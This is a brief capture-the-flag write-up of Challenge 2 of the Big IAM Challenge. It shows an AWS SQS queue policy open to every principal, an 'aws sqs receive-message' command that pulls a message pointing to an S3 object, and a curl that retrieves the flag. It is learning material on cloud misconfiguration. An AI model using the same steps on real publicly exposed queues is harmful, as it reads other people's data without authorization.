# Challenge 2

**Challenge 2:** https://bigiamchallenge.com/challenge/2

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/beef06fb-0903-4808-91a6-829c4fa1a139)

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/326502b7-6a9d-4206-b52b-fc598605de8d)

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/9ce14f58-323c-48c0-a65b-0ebc88518419)

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/083e789c-4805-409f-b46b-4b14f6cf2bac)

```sh
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": [
                "sqs:SendMessage",
                "sqs:ReceiveMessage"
            ],
            "Resource": "arn:aws:sqs:us-east-1:092297851374:wiz-tbic-analytics-sqs-queue-ca7a1b2"
        }
    ]
}
```

````sh
> aws sqs receive-message --queue-url https://sqs.us-east-1.amazonaws.com/092297851374/wiz-tbic-analytics-sqs-queue-ca7a1b2
{
    "Messages": [
        {
            "MessageId": "3e1288a5-cfd9-4218-96a4-edbc78448437",
            "ReceiptHandle": "AQEBWLtE6oNYluaPOmx7nTE8JACXjifNyEuikYU1ZpGho+4HxPgjjzt5dkQe2bMLKF5MRGgAL4XOfNDtL+FahoWZkAVbRwmiJgYUem6sbotuEjqgXbcRXHzegysxaEu14cNpY5Nhcc9p2Em+rkR+zo8sIPWjie
cmXgaac8O0P/GtkJVXzid1ERMM++KbBMtU/jnX/I5WwyhvzxuEobErzstqiFOSLrilxsfUfjuEVdUjR/eb7GRR9rkSEcnZKYfOHa98GH5gwdG2R0nVgT9N9dlhKxXdXvijW4YR0YPRdu3HSjgxV3FCBX1L2C8nG2NlIabMoTPh1VDgMoQcC63/OPhGTH
8Y/PaeRdEt/bafE1+wW5fSeDj80TPqjWgU2BX/faN8kJ9hfTKytT5lgUy+Uax9+qwjPlD2I+3eDFQohL/PhU8=",
            "MD5OfBody": "4cb94e2bb71dbd5de6372f7eaea5c3fd",
            "Body": "{\"URL\": \"https://tbic-wiz-analytics-bucket-b44867f.s3.amazonaws.com/pAXCWLa6ql.html\", \"User-Agent\": \"Lynx/2.5329.3258dev.35046 libwww-FM/2.14 SSL-MM/1.4.3714\",
 \"IsAdmin\": true}"
        }
    ]
}
> curl https://tbic-wiz-analytics-bucket-b44867f.s3.amazonaws.com/pAXCWLa6ql.html
{wiz:you-are-at-the-front-of-the-queue}
```
